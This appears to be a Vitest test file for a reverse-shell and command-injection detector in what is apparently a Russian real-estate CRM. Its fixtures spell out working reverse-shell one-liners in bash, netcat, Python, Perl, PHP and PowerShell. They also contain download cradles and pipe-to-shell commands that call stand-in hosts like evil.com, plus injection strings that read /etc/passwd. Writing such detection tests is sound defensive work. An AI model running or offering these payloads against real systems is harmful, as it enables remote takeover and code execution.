import { describe, it, expect } from 'vitest';
import {
  detectReverseShell,
  sanitizeShellInput,
  REVERSE_SHELL_PATTERNS
} from './commandSecurity';

describe('commandSecurity - Reverse Shell & Command Injection Detection', () => {
  describe('detectReverseShell', () => {
    it('detects bash /dev/tcp and /dev/udp reverse shell strings', () => {
      const payloads = [
        'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
        '/bin/bash -i > /dev/tcp/192.168.1.5/9001 0<&1 2>&1',
        'sh -i >& /dev/udp/attacker.com/8080 0>&1',
        'exec 5<>/dev/tcp/evil.com/443; cat <&5 | while read line; do $line 2>&5 >&5; done'
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('detects netcat reverse shell variants', () => {
      const payloads = [
        'nc -e /bin/bash 10.0.0.1 4242',
        'nc.traditional -e /bin/sh 192.168.0.1 1234',
        'ncat 10.0.0.1 4444 -e /bin/sh',
        'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f'
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('detects python reverse shells', () => {
      const payloads = [
        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        'python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('detects perl and php reverse shells', () => {
      const payloads = [
        'perl -e \'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
        'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\''
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('detects powershell reverse shells and download cradles', () => {
      const payloads = [
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)',
        'powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.0.1/s.ps1\')"'
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('detects pipe to shell attacks (curl | bash, wget | sh)', () => {
      const payloads = [
        'curl http://evil.com/shell.sh | bash',
        'wget -qO- https://attacker.org/setup.py | python'
      ];
      for (const payload of payloads) {
        const res = detectReverseShell(payload);
        expect(res.detected).toBe(true);
      }
    });

    it('passes normal messages and real estate text', () => {
      const normalTexts = [
        'Здравствуйте, отправляю договор купли-продажи квартиры.',
        'Цена объекта: 12 500 000 руб., площадь 65.4 кв.м',
        'Просмотр назначен на завтра в 15:00',
        'https://reacrm.ru/property/12345',
        'Прошу согласовать правки в пункте 4.2'
      ];
      for (const text of normalTexts) {
        const res = detectReverseShell(text);
        expect(res.detected).toBe(false);
      }
    });
  });

  describe('sanitizeShellInput', () => {
    it('strips shell metacharacters', () => {
      expect(sanitizeShellInput('test; cat /etc/passwd')).toBe('test cat /etc/passwd');
      expect(sanitizeShellInput('foo && bar | baz')).toBe('foo  bar  baz');
      expect(sanitizeShellInput('`id` $(whoami) > out.txt < in.txt')).toBe('id whoami  out.txt  in.txt');
    });
  });
});
